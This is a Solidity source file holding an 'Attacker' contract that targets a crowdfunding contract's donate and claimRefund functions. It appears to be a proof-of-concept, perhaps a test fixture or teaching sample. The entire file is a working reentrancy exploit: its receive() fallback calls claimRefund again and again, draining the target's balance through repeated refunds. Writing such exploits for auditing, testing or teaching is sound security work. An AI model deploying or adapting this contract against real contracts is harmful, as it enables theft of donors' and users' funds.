// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICrowdfund {
    function donate(uint256 id) external payable;
    function claimRefund(uint256 id) external;
}

contract Attacker {
    ICrowdfund public crowdfund;
    uint256 public attackCampaignId;

    constructor(address _crowdfund) {
        crowdfund = ICrowdfund(_crowdfund);
    }

    function attackDonate(uint256 id) external payable {
        crowdfund.donate{value: msg.value}(id);
    }

    function attackRefund(uint256 id) external {
        attackCampaignId = id;
        crowdfund.claimRefund(id);
    }

    receive() external payable {
        if (address(crowdfund).balance >= msg.value) {
            crowdfund.claimRefund(attackCampaignId);
        }
    }
}
